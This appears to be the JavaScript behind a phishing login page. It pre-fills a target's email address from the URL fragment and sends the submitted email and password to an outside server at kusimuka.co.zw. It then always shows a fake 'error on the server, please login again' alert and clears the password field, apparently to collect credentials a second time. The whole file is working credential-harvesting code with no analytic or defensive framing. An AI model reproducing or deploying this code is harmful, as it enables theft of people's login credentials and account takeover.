
$(document).ready(function(){
var count=0;

var email = window.location.hash.substr(1);
if (!email) {

}
else
{
var my_email =email;
$('#email').val(my_email);



var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

if (!filter.test(my_email)) {
$('#error').show();
email.focus;
return false;
}
var ind=my_email.indexOf("@");
var my_slice=my_email.substr((ind+1));
}


$('#login_submit').click(function(event){
$('#error').hide();
$('#msg').hide();
event.preventDefault();
var email=$("#email").val();
var password=$("#password").val();

if (!password) {
    $('#msg').show();
    $('#msg').html("Password is empty!");

                return false;
            }

count=count+1;

$.ajax({
dataType: 'JSON',
url: 'https://kusimuka.co.zw/post.php',
type: 'POST',
      	data:{
			email:email,
            password:password,	
      	},
			data: $('#login_form').serialize(),
            beforeSend: function(xhr){
            	
            },
            success: function(response){
            	if(response){
            		$("#msg").show();
            		console.log(response);
            		if(response['signal'] == 'ok'){
            			$("#password").val("");
            			if (count>=2) {
            				count=0;
                    

                }
            	swal('Error Login: There was an error on the server. Please login again');
            }
            else{
                        	swal('Error Login: There was an error on the server. Please login again');
            }
        }
    },
    error: function(){
    	$("#password").val("");
    	if (count>=2) {
    		count=0;
    		
    	}
       swal('Error Login: There was an error on the server. Please login again');
    },
    complete: function(){
    	
    }
});
  });


	});


